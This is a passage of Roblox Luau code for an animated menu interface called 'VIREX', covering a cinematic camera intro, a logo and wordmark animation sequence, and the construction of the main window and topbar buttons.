		local p = math.clamp((os.clock() - start) / duration, 0, 1)
		local fall = (1 - p) ^ 3 -- 1 up in the sky, 0 landed: drops fast, lands soft
		local center = hrp.Position + Vector3.new(0, 1.5, 0)
		local a = backAngle + fall * turns
		local h = 3.5 + 340 * fall ^ 1.15
		local r = 9 + 70 * fall
		local pos = center + Vector3.new(math.cos(a) * r, h, math.sin(a) * r)
		-- from looking down at you to looking over your shoulder
		local settle = (1 - fall) ^ 6
		local target = center:Lerp(center + flat * 30 + Vector3.new(0, 1, 0), settle)
		-- bank into the spin like a plane, level out at the end
		cam.CFrame = CFrame.lookAt(pos, target) * CFrame.Angles(0, 0, fall * 0.45)
	end)
	table.insert(connections, conn)
	cam.FieldOfView = 90
	tween(cam, duration, { FieldOfView = baseFov }, Q, OUT)
	local function punch(amount)
		local now = cam.FieldOfView
		tween(cam, 0.07, { FieldOfView = now - (amount or 10) }, QUAD)
		task.delay(0.07, function() tween(cam, 0.6, { FieldOfView = math.max(now, baseFov) }, BACK, OUT) end)
	end
	local function stop()
		conn:Disconnect()
		cam.CameraType = Enum.CameraType.Custom
		tween(cam, 0.9, { FieldOfView = oldFov }, Q)
	end
	return stop, punch
end

local function playIntro(onDone)
	local vp = viewport()
	local fit = math.min(1, (vp.X - 30) / 520, (vp.Y - 40) / 640)
	setBlur(8)
	sfx("Open", 0.55, 1)

	local intro = new("Frame", { Parent = gui, BackgroundColor3 = Theme.Bg, BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 100 })
	tween(intro, 0.9, { BackgroundTransparency = 0.72 })
	local stage = new("Frame", { Parent = intro, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 100 })
	local wash = new("Frame", { Parent = stage, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Theme.Accent, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 100 },
		{ new("UIGradient", { Rotation = 90, Transparency = nseq({ { 0, 0.5 }, { 0.5, 1 }, { 1, 0.4 } }) }) })
	tween(wash, 1.4, { BackgroundTransparency = 0.5 })

	-- Movie letterbox bars with a glowing inner edge
	local barH = math.floor(vp.Y * 0.11)
	local function bar(top)
		local b = new("Frame", {
			Parent = intro, AnchorPoint = Vector2.new(0, top and 0 or 1), Position = top and UDim2.fromOffset(0, -barH) or UDim2.new(0, 0, 1, barH),
			Size = UDim2.new(1, 0, 0, barH), BackgroundColor3 = BLACK, BorderSizePixel = 0, ZIndex = 125,
		})
		new("Frame", { Parent = b, AnchorPoint = Vector2.new(0, top and 1 or 0), Position = top and UDim2.fromScale(0, 1) or UDim2.fromScale(0, 0), Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = Theme.Accent2, BorderSizePixel = 0, ZIndex = 126 },
			{ new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0 }, { 1, 1 } }) }) })
		tween(b, 1, { Position = top and UDim2.fromOffset(0, 0) or UDim2.new(0, 0, 1, 0) }, EXPO, OUT)
		return b
	end
	local topBar, botBar = bar(true), bar(false)
	local hint = new("TextLabel", { Parent = botBar, BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Font = Enum.Font.GothamMedium, TextSize = 13, TextColor3 = Theme.Muted, TextTransparency = 1, ZIndex = 127,
		Text = isMobile and "Tap the VIREX button to open the menu" or ("Press " .. CONFIG.ToggleKey.Name .. " to open and close the menu") })

	local stopCam, punch = cinematicCamera(6.2)

	-- Falling through the clouds: soft white puffs rush past the camera
	for k = 1, 9 do
		task.delay(0.35 + k * 0.17, function()
			local a = math.random() * math.pi * 2
			local sz = math.random(260, 520)
			local cloud = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, math.cos(a) * 60, 0.45, math.sin(a) * 40), Size = UDim2.fromOffset(sz, sz * 0.6),
				BackgroundColor3 = WHITE, BackgroundTransparency = 0.35, BorderSizePixel = 0, ZIndex = 118 },
				{ corner(), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.3, 0.5 }, { 0.5, 0.2 }, { 0.7, 0.5 }, { 1, 1 } }) }) })
			local cs = new("UIScale", { Parent = cloud, Scale = 0.5 })
			tween(cloud, 1.1, { Position = UDim2.new(0.5, math.cos(a) * vp.X * 0.9, 0.45, math.sin(a) * vp.Y * 0.9), BackgroundTransparency = 1 }, QUAD, IN)
			tween(cs, 1.1, { Scale = 3 }, QUAD, IN)
			task.delay(1.15, function() cloud:Destroy() end)
		end)
	end

	-- Opening: total black, a line of light draws across the middle, then the screen splits open along it
	local lidTop = new("Frame", { Parent = intro, AnchorPoint = Vector2.new(0, 1), Position = UDim2.fromScale(0, 0.5), Size = UDim2.fromScale(1, 0.5), BackgroundColor3 = BLACK, BorderSizePixel = 0, ZIndex = 120 })
	local lidBot = new("Frame", { Parent = intro, AnchorPoint = Vector2.new(0, 0), Position = UDim2.fromScale(0, 0.5), Size = UDim2.fromScale(1, 0.5), BackgroundColor3 = BLACK, BorderSizePixel = 0, ZIndex = 120 })
	local seam = new("Frame", { Parent = intro, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(0, 2), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 122 },
		{ new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.2, 0.4 }, { 0.5, 0 }, { 0.8, 0.4 }, { 1, 1 } }) }) })
	local seamGlow = new("Frame", { Parent = intro, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(0, 24), BackgroundColor3 = WHITE, BackgroundTransparency = 0.8, BorderSizePixel = 0, ZIndex = 121 },
		{ corner(), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0.2 }, { 1, 1 } }) }) })
	tween(seam, 0.45, { Size = UDim2.fromOffset(vp.X, 2) }, EXPO, OUT)
	tween(seamGlow, 0.6, { Size = UDim2.fromOffset(vp.X * 0.8, 24) }, EXPO, OUT)
	task.delay(0.4, function()
		sfx("Boom", 0.4, 0.7)
		punch(8)
		tween(lidTop, 0.95, { Position = UDim2.fromScale(0, 0) }, Q, INOUT)
		tween(lidBot, 0.95, { Position = UDim2.fromScale(0, 1) }, Q, INOUT)
		tween(seam, 0.5, { BackgroundTransparency = 1, Size = UDim2.fromOffset(vp.X * 1.3, 1) }, Q, OUT, 0.15)
		tween(seamGlow, 0.6, { BackgroundTransparency = 1, Size = UDim2.fromOffset(vp.X * 1.3, 120) }, Q, OUT)
		task.delay(1, function() lidTop:Destroy() lidBot:Destroy() seam:Destroy() seamGlow:Destroy() end)
	end)
	-- Implosion: streaks of light get sucked into the middle right before the logo lands
	task.delay(0.8, function()
		local cx, cy = vp.X / 2, vp.Y * 0.37
		local R = math.max(vp.X, vp.Y) * 0.75
		for k = 1, 34 do
			local a = math.random() * math.pi * 2
			local sx, sy = cx + math.cos(a) * R * (0.7 + math.random() * 0.4), cy + math.sin(a) * R * (0.7 + math.random() * 0.4)
			local line = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(sx, sy), Size = UDim2.fromOffset(math.random(40, 110), math.random(1, 3)), Rotation = math.deg(a),
				BackgroundColor3 = (k % 4 == 0) and Theme.Accent2 or WHITE, BackgroundTransparency = 0.15, BorderSizePixel = 0, ZIndex = 105 },
				{ new("UIGradient", { Transparency = nseq({ { 0, 0 }, { 1, 1 } }) }) })
			local t = 0.45 + math.random() * 0.12
			tween(line, t, { Position = UDim2.fromOffset(cx, cy), Size = UDim2.fromOffset(8, 1), BackgroundTransparency = 0.6 }, QUAD, IN, k * 0.004)
			task.delay(t + k * 0.004, function() line:Destroy() end)
		end
	end)

	-- Streaks and rising particles
	local alive = true
	task.spawn(function()
		while alive do
			local y = math.random(15, 85) / 100
			local streak = new("Frame", {
				Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(-0.3, y), Size = UDim2.new(0, math.random(200, 520), 0, math.random(1, 3)),
				BackgroundColor3 = WHITE, BorderSizePixel = 0, Rotation = -8, ZIndex = 101,
			}, { new("UIGradient", { Color = seq({ Theme.Accent, Theme.Accent2, WHITE }), Transparency = nseq({ { 0, 1 }, { 0.8, 0.2 }, { 1, 0 } }) }) })
			tween(streak, math.random(5, 9) / 10, { Position = UDim2.fromScale(1.3, y - 0.12) }, QUAD, IN)
			task.delay(1, function() streak:Destroy() end)
			task.wait(math.random(6, 18) / 100)
		end
	end)
	task.spawn(function()
		while alive do
			local s = math.random(2, 6)
			local p = new("Frame", {
				Parent = stage, BackgroundColor3 = (math.random() < 0.3) and Theme.Hot or Theme.Accent2, BackgroundTransparency = 0.1, BorderSizePixel = 0,
				Position = UDim2.fromOffset(math.random(0, math.floor(vp.X)), vp.Y + 10), Size = UDim2.fromOffset(s, s), ZIndex = 101,
			}, { corner() })
			local dur = math.random(16, 30) / 10
			tween(p, dur, { Position = UDim2.fromOffset(p.Position.X.Offset + math.random(-90, 90), math.random(-40, math.floor(vp.Y * 0.5))), BackgroundTransparency = 1 }, SINE)
			task.delay(dur, function() p:Destroy() end)
			task.wait(0.03)
		end
	end)
	-- impact: a blade of light cuts across the screen (no rings)
	local function shock(delayTime, color, cy, maxSize)
		task.delay(delayTime or 0, function()
			local w = math.max(vp.X * 1.4, maxSize or 0)
			local blade = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, cy or 0.4), Size = UDim2.fromOffset(40, 2), BackgroundColor3 = color or WHITE, BorderSizePixel = 0, ZIndex = 108 },
				{ new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0 }, { 1, 1 } }) }) })
			local haze = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, cy or 0.4), Size = UDim2.fromOffset(40, 60), BackgroundColor3 = color or WHITE, BackgroundTransparency = 0.75, BorderSizePixel = 0, ZIndex = 103 },
				{ corner(), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0.3 }, { 1, 1 } }) }) })
			tween(blade, 0.5, { Size = UDim2.fromOffset(w, 2) }, EXPO, OUT)
			tween(haze, 0.6, { Size = UDim2.fromOffset(w * 0.8, 6) }, EXPO, OUT)
			task.delay(0.3, function()
				tween(blade, 0.6, { BackgroundTransparency = 1 })
				tween(haze, 0.5, { BackgroundTransparency = 1 })
			end)
			task.delay(1, function() blade:Destroy() haze:Destroy() end)
		end)
	end
	local function shake(power, time)
		task.spawn(function()
			local t0 = os.clock()
			while os.clock() - t0 < (time or 0.25) do
				stage.Position = UDim2.fromOffset(math.random(-power, power), math.random(-power, power))
				RunService.RenderStepped:Wait()
			end
			stage.Position = UDim2.fromOffset(0, 0)
		end)
	end
	local function flash(amount)
		local f = new("Frame", { Parent = intro, BackgroundColor3 = WHITE, BackgroundTransparency = amount or 0.5, Size = UDim2.fromScale(1, 1), ZIndex = 124 })
		tween(f, 0.6, { BackgroundTransparency = 1 })
		task.delay(0.65, function() f:Destroy() end)
	end

	-- God rays turning slowly behind the logo
	local rays = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.37), Size = UDim2.fromOffset(10, 10), BackgroundTransparency = 1, ZIndex = 101 })
	local rayList = {}
	for i = 1, 8 do
		local len = math.floor(math.max(vp.X, vp.Y) * (i % 2 == 0 and 1.1 or 0.8))
		local ray = new("Frame", {
			Parent = rays, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(i % 2 == 0 and 10 or 4, len), Rotation = i * 22.5,
			BackgroundColor3 = (i % 3 == 0) and Theme.Hot or Theme.Accent2, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 101,
		}, { new("UIGradient", { Rotation = 90, Transparency = nseq({ { 0, 1 }, { 0.42, 0.55 }, { 0.5, 0.85 }, { 0.58, 0.55 }, { 1, 1 } }) }) })
		table.insert(rayList, ray)
	end
	task.spawn(function()
		local t0 = os.clock()
		while rays.Parent do
			rays.Rotation = (os.clock() - t0) * 12
			RunService.RenderStepped:Wait()
		end
	end)
	local function flare()
		local core = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.37), Size = UDim2.fromOffset(0, 3), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 110 },
			{ new("UIGradient", { Color = seq({ Theme.Accent, Theme.Accent2, WHITE, Theme.Accent2, Theme.Accent }), Transparency = nseq({ { 0, 1 }, { 0.5, 0 }, { 1, 1 } }) }) })
		local haze = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.37), Size = UDim2.fromOffset(0, 26), BackgroundColor3 = Theme.Accent2, BackgroundTransparency = 0.6, BorderSizePixel = 0, ZIndex = 109 },
			{ corner(), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0.2 }, { 1, 1 } }) }) })
		tween(core, 0.35, { Size = UDim2.fromOffset(vp.X * 1.3, 3) }, EXPO, OUT)
		tween(haze, 0.45, { Size = UDim2.fromOffset(vp.X * 0.9, 26) }, EXPO, OUT)
		task.delay(0.35, function()
			tween(core, 0.9, { BackgroundTransparency = 1, Size = UDim2.fromOffset(vp.X * 1.5, 1) })
			tween(haze, 0.9, { BackgroundTransparency = 1 })
		end)
		task.delay(1.3, function() core:Destroy() haze:Destroy() end)
	end

	-- The orb (your GIF) opening like a portal
	local orb = orbView(stage, math.floor(380 * fit), 102)
	orb.Position = UDim2.fromScale(0.5, 0.37)
	orb.GroupTransparency = 1
	local orbScale = new("UIScale", { Parent = orb, Scale = 0.2 })
	local orbRim = stroke(WHITE, 3, 0.2)
	orbRim.Parent = orb
	spinGradient(new("UIGradient", { Parent = orbRim, Color = seq({ Theme.Accent2, Theme.Accent, Theme.Hot, Theme.Accent2 }), Transparency = nseq({ { 0, 0 }, { 0.5, 0.8 }, { 1, 0 } }) }), 160)
	task.delay(0.4, function()
		tween(orb, 1.2, { GroupTransparency = 0.08 })
		tween(orbScale, 1.6, { Scale = 1 }, EXPO, OUT)
	end)

	-- Logo: ghost copies rush in from the corners and fuse into the real logo
	local L = math.floor(210 * fit)
	local rig, logoGlow = logoRig(stage, L, 104)
	rig.Position = UDim2.fromScale(0.5, 0.37)
	local rigScale = new("UIScale", { Parent = rig, Scale = 0 })
	local corners = { { -0.45, -0.4 }, { 0.45, -0.4 }, { -0.45, 0.4 }, { 0.45, 0.4 } }
	for k, c in ipairs(corners) do
		local ghost = new("ImageLabel", {
			Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5 + c[1], 0.37 + c[2]), Size = UDim2.fromOffset(L * 1.4, L * 1.4),
			BackgroundTransparency = 1, Image = CONFIG.LogoImage, ImageColor3 = (k % 2 == 0) and Theme.Accent2 or Theme.Hot, ImageTransparency = 1, Rotation = c[1] * 80, ZIndex = 103,
		})
		task.delay(0.6, function()
			tween(ghost, 0.25, { ImageTransparency = 0.35 })
			tween(ghost, 0.75, { Position = UDim2.fromScale(0.5, 0.37), Size = UDim2.fromOffset(L, L), Rotation = 0 }, Q, IN)
			task.delay(0.75, function() tween(ghost, 0.3, { ImageTransparency = 1 }) task.delay(0.3, function() ghost:Destroy() end) end)
		end)
	end
	task.delay(1.35, function()
		tween(rigScale, 1, { Scale = 1 }, ELASTIC, OUT)
		sfx("Boom", 0.5, 1)
		sfx("Slam", 0.6, 0.8)
		flash(0.35)
		shock(0, WHITE, 0.37)
		shock(0.1, Theme.Hot, 0.37)
		shock(0.2, Theme.Accent2, 0.37)
		shake(10, 0.4)
		punch(14)
		burst(stage, vp.X / 2, vp.Y * 0.37, Theme.Accent2, 24)
		flare()
		-- two ghost copies snap together from the sides (split, then lock)
		for k = -1, 1, 2 do
			local g = new("ImageLabel", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, k * 26, 0.37, 0), Size = UDim2.fromOffset(L, L), BackgroundTransparency = 1,
				Image = CONFIG.LogoImage, ImageColor3 = k < 0 and WHITE or Color3.fromRGB(140, 142, 150), ImageTransparency = 0.3, ZIndex = 103 })
			tween(g, 0.45, { Position = UDim2.fromScale(0.5, 0.37), ImageTransparency = 1 }, Q, OUT)
			task.delay(0.5, function() g:Destroy() end)
		end
		for k, ray in ipairs(rayList) do tween(ray, 1.2, { BackgroundTransparency = 0.25 }, Q, OUT, k * 0.04) end
		task.delay(0.6, function() for _, sg in ipairs(logoShines) do if sg.Parent and sg.Parent.Parent == rig then shineLogo(sg) end end end)
	end)
	task.spawn(function()
		local t0 = os.clock()
		while alive and rig.Parent do
			local t = os.clock() - t0
			rig.Rotation = math.sin(t * 1.4) * 4
			rig.Position = UDim2.new(0.5, 0, 0.37, math.sin(t * 2) * 6)
			RunService.RenderStepped:Wait()
		end
	end)

	-- Front wordmark: glowing gradient letters that slam in one by one
	local LETTER = 112
	local probe = epicText(stage, "V", LETTER, 107)
	local pad = probe.padX
	probe.group:Destroy()
	local word = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.65), Size = UDim2.fromOffset(0, 200), AutomaticSize = Enum.AutomaticSize.X, BackgroundTransparency = 1, ZIndex = 106 },
		{ new("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, HorizontalAlignment = Enum.HorizontalAlignment.Center, VerticalAlignment = Enum.VerticalAlignment.Center, Padding = UDim.new(0, -pad * 2 + 6), SortOrder = Enum.SortOrder.LayoutOrder }) })
	local wordScale = new("UIScale", { Parent = word, Scale = 1 })
	local letters = {}
	for i, ch in ipairs({ "V", "I", "R", "E", "X" }) do
		local isPeak = ch == "I"
		local t = epicText(word, ch, LETTER, 107, nil)
		t.group.LayoutOrder = i
		t.group.GroupTransparency = 1
		t.scale.Scale = 2.8
		if isPeak then
			t.spark = new("Frame", { Parent = t.group, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0, t.padY - 2), Size = UDim2.fromOffset(0, 0), BackgroundColor3 = WHITE, Rotation = 45, BorderSizePixel = 0, ZIndex = 112 })
			stroke(Theme.Accent2, 3, 0.3).Parent = t.spark
		end
		letters[i] = t
	end
	-- fit the word to the screen whatever font is used
	local total = 0
	for _, t in ipairs(letters) do total = total + t.width end
	total = total + (#letters - 1) * (-pad * 2 + 6)
	wordScale.Scale = math.min(1, (vp.X - 30) / math.max(total, 1), 1.0)
	local underline = new("Frame", { Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.735), Size = UDim2.fromOffset(0, 3), BackgroundColor3 = Theme.Accent2, BorderSizePixel = 0, ZIndex = 106 },
		{ new("UIGradient", { Color = seq({ Theme.Accent, WHITE, Theme.Accent }), Transparency = nseq({ { 0, 1 }, { 0.5, 0 }, { 1, 1 } }) }) })
	local thanks = epicText(stage, "THANK YOU FOR USING VIREX", 30, 106, nil)
	thanks.group.AnchorPoint = Vector2.new(0.5, 0.5)
	thanks.group.Position = UDim2.fromScale(0.5, 0.79)
	thanks.scale.Scale = math.min(1, (vp.X - 20) / thanks.width)
	for _, l in ipairs(thanks.labels) do l.MaxVisibleGraphemes = 0 end
	local sub = new("TextLabel", {
		Parent = stage, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.845), Size = UDim2.new(1, -40, 0, 18), BackgroundTransparency = 1,
		Font = FONT_HEAD, TextSize = 12, TextColor3 = WHITE, TextTransparency = 1, Text = string.upper(CONFIG.Version), ZIndex = 106,
	})

	task.spawn(function()
		task.wait(2.1)
		for i, l in ipairs(letters) do
			l.group.Rotation = (i % 2 == 0) and 16 or -16
			tween(l.group, 0.25, { GroupTransparency = 0 })
			tween(l.scale, 0.55, { Scale = 1 }, BACK, OUT)
			tween(l.group, 0.55, { Rotation = 0 }, BACK, OUT)
			task.delay(0.3, function() sweepText(l, 0.7) end)
			if l.spark then tween(l.spark, 0.6, { Size = UDim2.fromOffset(16, 16) }, BACK, OUT, 0.25) end
			sfx("Slam", 0.85 + i * 0.1, 0.6)
			task.delay(0.18, function() shake(4, 0.12) punch(4) end)
			task.wait(0.13)
		end
		task.wait(0.25)
		shock(0, Theme.Accent2, 0.65, 800)
		sfx("Boom", 0.8, 0.6)
		tween(underline, 0.9, { Size = UDim2.fromOffset(math.floor(480 * fit), 3) }, EXPO, OUT)
		task.wait(0.35)
		local total = #"THANK YOU FOR USING VIREX"
		for k = 1, total do
			for _, l in ipairs(thanks.labels) do l.MaxVisibleGraphemes = k end
			if k % 3 == 0 then sfx("Hover", 1.9, 0.25) end
			task.wait(0.03)
		end
		for _, l in ipairs(thanks.labels) do l.MaxVisibleGraphemes = -1 end
		sfx("Notify", 1, 0.6)
		local base = thanks.scale.Scale
		thanks.scale.Scale = base * 1.2
		tween(thanks.scale, 0.7, { Scale = base }, ELASTIC, OUT)
		sweepText(thanks, 1)
		for _, l in ipairs(letters) do sweepText(l, 0.9) end
		tween(sub, 0.7, { TextTransparency = 0 })
		tween(hint, 0.7, { TextTransparency = 0 })
		task.wait(1.7)

		-- Outro: everything rushes past the camera, bars open, flash, back to the game
		alive = false
		sfx("Open", 1.1, 0.9)
		tween(topBar, 0.7, { Position = UDim2.fromOffset(0, -barH) }, EXPO, IN)
		tween(botBar, 0.7, { Position = UDim2.new(0, 0, 1, barH) }, EXPO, IN)
		tween(rigScale, 0.7, { Scale = 5 }, Q, IN)
		for _, d in ipairs(rig:GetDescendants()) do
			if d:IsA("ImageLabel") then tween(d, 0.6, { ImageTransparency = 1 }, Q, IN)
			elseif d:IsA("Frame") then tween(d, 0.6, { BackgroundTransparency = 1 }) end
		end
		tween(orbScale, 0.8, { Scale = 2.6 }, Q, IN)
		tween(orb, 0.7, { GroupTransparency = 1 })
		for i, l in ipairs(letters) do
			tween(l.group, 0.5, { GroupTransparency = 1, Rotation = (i % 2 == 0) and 25 or -25 }, BACK, IN, i * 0.04)
			tween(l.scale, 0.5, { Scale = 3 }, Q, IN, i * 0.04)
		end
		tween(thanks.group, 0.5, { GroupTransparency = 1 })
		tween(thanks.scale, 0.5, { Scale = thanks.scale.Scale * 1.6 }, Q, IN)
		tween(sub, 0.5, { TextTransparency = 1 })
		for _, ray in ipairs(rayList) do tween(ray, 0.5, { BackgroundTransparency = 1 }) end
		tween(underline, 0.5, { Size = UDim2.fromOffset(0, 2) }, Q, IN)
		task.wait(0.55)
		flash(0.15)
		shock(0, WHITE, 0.5, 1800)
		stopCam()
		tween(intro, 0.7, { BackgroundTransparency = 1 })
		tween(wash, 0.7, { BackgroundTransparency = 1 })
		onDone()
		task.wait(0.9)
		intro:Destroy()
	end)
end

---------------------------------------------------------------------------
-- Window
---------------------------------------------------------------------------
local W, H = 660, 440
local root = new("Frame", { Parent = gui, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 22), Size = UDim2.fromOffset(W, H), BackgroundTransparency = 1, Visible = false, ZIndex = 10 })
local rootScale = new("UIScale", { Parent = root, Scale = 1 })
local function fitScale()
	local vp = viewport()
	return math.min(1, (vp.X - 20) / W, (vp.Y - 100) / H)
end

local glow = new("Frame", { Parent = root, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.new(1, 22, 1, 22), BackgroundColor3 = Theme.Accent, BackgroundTransparency = 1, Visible = false, ZIndex = 9 }, { corner(34) })
themeProp(glow, "BackgroundColor3")
local glowFlash = 0

local window = new("CanvasGroup", { Parent = root, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Theme.Panel, BackgroundTransparency = 0, GroupTransparency = 1, ZIndex = 10 }, { corner(26) })
themeProp(window, "BackgroundColor3", "Panel")
local winScale = new("UIScale", { Parent = window, Scale = 1 })

-- Layer 1: theme photo
local photoHolder = new("Frame", { Parent = window, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(1.08, 1.08), BackgroundTransparency = 1, ZIndex = 10 })
local bgPhoto = new("ImageLabel", { Parent = photoHolder, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ScaleType = Enum.ScaleType.Crop, ZIndex = 10 })
-- Readability: a dark veil over the photo. Stronger on moving backgrounds so white text always reads.
local scrim = new("Frame", { Parent = window, Size = UDim2.fromScale(1, 1), BackgroundColor3 = BLACK, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 10 },
	{ new("UIGradient", { Rotation = 90, Transparency = nseq({ { 0, 0.05 }, { 0.18, 0.25 }, { 0.6, 0.35 }, { 1, 0.15 } }) }) })
-- Layer 3: readability fade (dark on the left, lighter on the right)
local fade = new("Frame", { Parent = window, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Theme.Panel, BorderSizePixel = 0, Visible = false, ZIndex = 10 },
	{ new("UIGradient", { Rotation = 0, Transparency = nseq({ { 0, 0.3 }, { 0.45, 0.6 }, { 1, 0.9 } }) }) })
themeProp(fade, "BackgroundColor3", "Panel")
-- A band of light that sweeps across the glass now and then
local sweep = new("Frame", { Parent = window, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(-0.4, 0.5), Size = UDim2.new(0, 140, 2, 0), Rotation = 20, BackgroundColor3 = WHITE, BorderSizePixel = 0, Visible = false, ZIndex = 10 },
	{ new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.5, 0.9 }, { 1, 1 } }) }) })

-- Specular light on the glass: a soft white glow that slides around when you tilt the phone
local specular = new("Frame", { Parent = window, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.3, 0.2), Size = UDim2.fromScale(1.1, 0.9), Rotation = -18, BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 11 },
	{ corner(), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.35, 0.94 }, { 0.5, 0.9 }, { 0.65, 0.94 }, { 1, 1 } }) }) })
-- Dust drifting up through the glass
local dust = {}
for i = 1, 16 do
	local sz = math.random(2, 4)
	local d = new("Frame", { Parent = window, AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(sz, sz), BackgroundColor3 = WHITE, BackgroundTransparency = 0.6, BorderSizePixel = 0, ZIndex = 11 }, { corner() })
	table.insert(dust, { f = d, x = math.random(), p = math.random(), sp = 0.03 + math.random() * 0.05, depth = 0.4 + math.random() * 0.6 })
end

local function applyBackground(t, animate)
	local sheet = themeSheet(t)
	tween(scrim, animate and 0.8 or 0, { BackgroundTransparency = sheet and 0.3 or ((t.Background or "") ~= "" and 0.62 or 1) }, Q)
	local photo = sheet and sheet.Image or (t.Background or "")
	local function set()
		applySheet(bgPhoto, sheet)
		bgPhoto.Image = photo
	end
	if animate then
		tween(bgPhoto, 0.3, { ImageTransparency = 1 })
		task.delay(0.3, function()
			set()
			bgPhoto.Size = UDim2.fromScale(1.15, 1.15)
			bgPhoto.Position = UDim2.fromScale(-0.075, -0.075)
			if photo ~= "" then tween(bgPhoto, 1, { ImageTransparency = t.Dim or 0.35, Size = UDim2.fromScale(1, 1), Position = UDim2.fromScale(0, 0) }, EXPO) end
		end)
	else
		set()
		bgPhoto.ImageTransparency = photo ~= "" and (t.Dim or 0.35) or 1
	end
end
applyBackground(currentTheme, false)

-- Border: spinning colour rim
local border = new("Frame", { Parent = root, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 40 }, { corner(26) })
local borderScale = new("UIScale", { Parent = border, Scale = 1 })
local borderStroke = stroke(WHITE, 1.8, 0)
borderStroke.Parent = border
spinGradient(themedBorder(new("UIGradient", { Parent = borderStroke })), 80)

---------------------------------------------------------------------------
-- Topbar: logo, title, liquid-glass tab pill, window buttons
---------------------------------------------------------------------------
local topbar = new("Frame", { Parent = window, Size = UDim2.new(1, 0, 0, 68), BackgroundTransparency = 1, ZIndex = 12 })
local topLogo, topGlow = logoRig(topbar, 40, 13)
topLogo.Position = UDim2.fromOffset(38, 34)
local titleText = epicText(topbar, "VIREX", 21, 13)
titleText.group.Position = UDim2.fromOffset(66 - titleText.padX, 13 - titleText.padY)
titleText.scale.Name = "Pop"
local title = titleText.group
new("TextLabel", { Parent = topbar, BackgroundTransparency = 1, Position = UDim2.fromOffset(66, 39), Size = UDim2.fromOffset(120, 14), Font = Enum.Font.Gotham, TextSize = 11, Text = CONFIG.Version, TextColor3 = Theme.Muted, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 13 })

local function circleButton(text, xOffset, hoverColor)
	local b = new("TextButton", { Parent = topbar, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, xOffset, 0.5, 0), Size = UDim2.fromOffset(34, 34), AutoButtonColor = false, BackgroundColor3 = Theme.Card, Font = Enum.Font.GothamBold, TextSize = 16, Text = text, TextColor3 = Theme.Text, ZIndex = 14 }, { corner() })
	liquidGlass(b, 0.5)
	local sc = new("UIScale", { Parent = b, Name = "Pop" })
	glassInteract(b, nil)
	bind(b.MouseEnter, function() sfx("Hover", 1.5, 0.2) tween(sc, 0.45, { Scale = 1.1 }, Q) tween(b, 0.55, { Rotation = 90 }, Q) tween(b, 0.3, { TextColor3 = hoverColor }) end)
	bind(b.MouseLeave, function() tween(sc, 0.45, { Scale = 1 }, Q) tween(b, 0.55, { Rotation = 0 }, Q) tween(b, 0.3, { TextColor3 = Theme.Text }) end)
	bind(b.InputBegan, function(input) if isPress(input) then sfx("Click", 0.8, 0.7) pressBounce(sc, 0.85) end end)
	return b
end
